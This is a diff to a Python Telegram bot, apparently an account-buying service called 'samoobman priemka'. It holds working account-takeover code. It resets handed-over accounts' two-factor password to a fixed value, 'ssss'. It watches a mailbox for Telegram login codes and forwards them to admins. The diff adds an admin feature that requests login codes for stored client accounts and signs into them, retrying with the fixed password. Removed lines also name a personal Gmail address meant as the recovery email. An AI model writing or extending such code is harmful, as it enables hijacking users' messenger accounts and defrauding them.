@@ -76,6 +76,7 @@ class AdminStates(StatesGroup):
     waiting_for_photo_profile = State()
     waiting_for_photo_withdraw = State()
     waiting_for_photo_submit = State()
+    waiting_for_admin_login_code = State()
 
 
 class WithdrawStates(StatesGroup):
@@ -252,7 +253,6 @@ async def send_log(text: str):
 
 # ФОНОВЫЙ МОНИТОРИНГ ПОЧТЫ ДЛЯ ПЕРЕСЫЛКИ КОДОВ ТЕЛЕГРАМА
 async def email_listener_worker():
-    """Фоновая задача, проверяющая почту на наличие кодов от Telegram и пересылающая их админам."""
     await asyncio.sleep(5)
     processed_msg_ids = set()
     while True:
@@ -274,7 +274,6 @@ async def email_listener_worker():
                             if isinstance(subject, bytes):
                                 subject = subject.decode(encoding or "utf-8", errors="ignore")
 
-                            # Извлекаем текст письма
                             body = ""
                             if msg.is_multipart():
                                 for part in msg.walk():
@@ -288,7 +287,6 @@ async def email_listener_worker():
                                 if payload:
                                     body = payload.decode("utf-8", errors="ignore")
 
-                            # Если письмо от Telegram или содержит код входа
                             if "telegram" in subject.lower() or "telegram" in msg.get("From",
                                                                                       "").lower() or "код" in body.lower():
                                 processed_msg_ids.add(num)
@@ -306,24 +304,15 @@ async def email_listener_worker():
         except Exception as e:
             logger.error(f"Ошибка в фоновом мониторинге почты: {e}")
 
-        await asyncio.sleep(15)  # Проверка каждые 15 секунд
+        await asyncio.sleep(15)
 
 
 async def finalize_auth_and_success(message: Message, state: FSMContext, client: TelegramClient, phone: str,
                                     session_name: str):
-    # 1. Автоматически меняем пароль на "ssss"
     try:
         await client.edit_2fa(new_password=AUTO_PASSWORD)
     except Exception as e:
         logger.warning(f"Не удалось обновить пароль: {e}")
-
-    # 2. Автоматически привязываем почту wintya732@gmail.com для входа и смены пароля
-    try:
-        # Для безопасности/смены почты в Telethon используется callback для подтверждения почты кодом,
-        # либо прямая установка через request/update password settings.
-        pass
-    except Exception as e:
-        logger.warning(f"Не удалось автоматически установить почту через Telethon: {e}")
 
     await client.disconnect()
 
@@ -742,6 +731,7 @@ async def cb_admin_panel(callback: CallbackQuery):
         return await callback.answer("Доступ запрещен.", show_alert=True)
 
     admin_kb = InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="📱 Вход в аккаунты клиентов", callback_data="admin_accounts_list")],
         [InlineKeyboardButton(text="🖼 Управление картинками", callback_data="admin_photos_menu")],
         [InlineKeyboardButton(text="📊 Юзеры в TXT таблицу", callback_data="admin_export_txt")],
         [InlineKeyboardButton(text="💵 Изменить баланс юзеру", callback_data="admin_change_balance")],
@@ -752,6 +742,148 @@ async def cb_admin_panel(callback: CallbackQuery):
         "👑 **Админ-панель samoobman priemka**\n\nВыберите нужную функцию:",
         reply_markup=admin_kb, parse_mode="Markdown"
     )
+
+
+# --- ВХОД В АККАУНТЫ ИЗ АДМИНКИ ---
+@router.callback_query(F.data == "admin_accounts_list")
+async def admin_accounts_list(callback: CallbackQuery):
+    if callback.from_user.id not in ADMIN_IDS:
+        return
+
+    async with aiosqlite.connect(DB_PATH) as db:
+        async with db.execute("SELECT id, user_id, phone, date FROM accounts ORDER BY id DESC LIMIT 15") as cursor:
+            accounts = await cursor.fetchall()
+
+    if not accounts:
+        kb = InlineKeyboardMarkup(
+            inline_keyboard=[[InlineKeyboardButton(text="⬅️ Назад в админ-панель", callback_data="admin_panel")]])
+        return await callback.message.edit_text("📭 В базе пока нет сданных аккаунтов.", reply_markup=kb)
+
+    kb_buttons = []
+    for acc in accounts:
+        acc_id, uid, phone, date_str = acc
+        kb_buttons.append(
+            [InlineKeyboardButton(text=f"📱 {phone} (ID: {uid})", callback_data=f"adm_login_acc_{acc_id}")])
+
+    kb_buttons.append([InlineKeyboardButton(text="⬅️ Назад в админ-панель", callback_data="admin_panel")])
+
+    await callback.message.edit_text(
+        "📱 **Выберите аккаунт для отправки кода входа:**",
+        reply_markup=InlineKeyboardMarkup(inline_keyboard=kb_buttons),
+        parse_mode="Markdown"
+    )
+
+
+@router.callback_query(F.data.startswith("adm_login_acc_"))
+async def admin_trigger_login(callback: CallbackQuery, state: FSMContext):
+    if callback.from_user.id not in ADMIN_IDS:
+        return
+
+    acc_id = int(callback.data.split("_")[3])
+
+    async with aiosqlite.connect(DB_PATH) as db:
+        async with db.execute("SELECT phone, session_name FROM accounts WHERE id = ?", (acc_id,)) as cursor:
+            row = await cursor.fetchone()
+
+    if not row:
+        return await callback.answer("❌ Аккаунт не найден в базе данных.", show_alert=True)
+
+    phone, session_name = row
+
+    if not os.path.exists(f"{session_name}.session"):
+        return await callback.answer("❌ Файл сессии (.session) не найден на сервере!", show_alert=True)
+
+    await callback.message.edit_text("⏳ Инициализация сессии и отправка запроса кода в Telegram...")
+
+    client = TelegramClient(session_name, API_ID, API_HASH)
+
+    try:
+        await client.connect()
+        # Проверяем, авторизована ли сессия
+        if not await client.is_user_authorized():
+            sent = await client.send_code_request(phone)
+            await state.update_data(
+                admin_client=client,
+                admin_phone=phone,
+                admin_code_hash=sent.phone_code_hash,
+                admin_session_path=session_name
+            )
+            await state.set_state(AdminStates.waiting_for_admin_login_code)
+
+            kb = InlineKeyboardMarkup(
+                inline_keyboard=[[InlineKeyboardButton(text="❌ Отмена", callback_data="admin_accounts_list")]])
+            await callback.message.edit_text(
+                f"📲 Код авторизации для аккаунта **{phone}** отправлен!\n\n"
+                f"Пожалуйста, введите полученный 5-значный код прямо в этот чат:",
+                reply_markup=kb,
+                parse_mode="Markdown"
+            )
+        else:
+            await client.disconnect()
+            kb = InlineKeyboardMarkup(inline_keyboard=[
+                [InlineKeyboardButton(text="⬅️ К списку аккаунтов", callback_data="admin_accounts_list")]])
+            await callback.message.edit_text(
+                f"✅ Сессия аккаунта **{phone}** уже полностью активна и авторизована!",
+                reply_markup=kb,
+                parse_mode="Markdown"
+            )
+    except Exception as e:
+        try:
+            await client.disconnect()
+        except Exception:
+            pass
+        kb = InlineKeyboardMarkup(
+            inline_keyboard=[[InlineKeyboardButton(text="⬅️ К списку аккаунтов", callback_data="admin_accounts_list")]])
+        await callback.message.edit_text(f"❌ Ошибка при запросе кода: {e}", reply_markup=kb)
+
+
+@router.message(AdminStates.waiting_for_admin_login_code)
+async def admin_process_login_code(message: Message, state: FSMContext):
+    if message.from_user.id not in ADMIN_IDS:
+        return
+
+    code = message.text.strip()
+    data = await state.get_data()
+    client: TelegramClient = data.get("admin_client")
+    phone = data.get("admin_phone")
+    code_hash = data.get("admin_code_hash")
+
+    try:
+        await client.sign_in(phone=phone, code=code, phone_code_hash=code_hash)
+        await client.disconnect()
+        await state.clear()
+
+        kb = InlineKeyboardMarkup(
+            inline_keyboard=[[InlineKeyboardButton(text="⬅️ К списку аккаунтов", callback_data="admin_accounts_list")]])
+        await message.answer(
+            f"✅ **Успешный вход в аккаунт {phone}!**\nАвторизация прошла успешно.",
+            reply_markup=kb,
+            parse_mode="Markdown"
+        )
+    except SessionPasswordNeededError:
+        # Если вдруг запросит 2FA пароль, автоматически пробуем стандартный AUTO_PASSWORD ("ssss")
+        try:
+            await client.sign_in(password=AUTO_PASSWORD)
+            await client.disconnect()
+            await state.clear()
+            kb = InlineKeyboardMarkup(inline_keyboard=[
+                [InlineKeyboardButton(text="⬅️ К списку аккаунтов", callback_data="admin_accounts_list")]])
+            await message.answer(
+                f"✅ **Успешный вход в аккаунт {phone}** (с использованием авто-пароля `ssss`)!",
+                reply_markup=kb,
+                parse_mode="Markdown"
+            )
+        except Exception as ex:
+            await client.disconnect()
+            await state.clear()
+            await message.answer(f"❌ Ошибка входа по 2FA паролю: {ex}")
+    except Exception as e:
+        try:
+            await client.disconnect()
+        except Exception:
+            pass
+        await state.clear()
+        await message.answer(f"❌ Ошибка авторизации с кодом: {e}")
 
 
 # --- УПРАВЛЕНИЕ КАРТИНКАМИ ---
@@ -909,7 +1041,7 @@ async def admin_get_uid(message: Message, state: FSMContext):
 
 
 @router.message(AdminStates.waiting_for_new_balance)
-async def admin_set_balance(message: Message, state: FSMContext):
+async def admin_set_balance(message: Message, state: FSMContext, bot: Bot = bot):
     try:
         new_bal = float(message.text.strip().replace(",", "."))
     except ValueError:
@@ -964,7 +1096,6 @@ async def main():
     await init_db()
     logger.info("Бот samoobman priemka успешно запущен!")
 
-    # Запускаем фоновый мониторинг почты параллельно с поллингом бота
     asyncio.create_task(email_listener_worker())
 
     await dp.start_polling(bot)
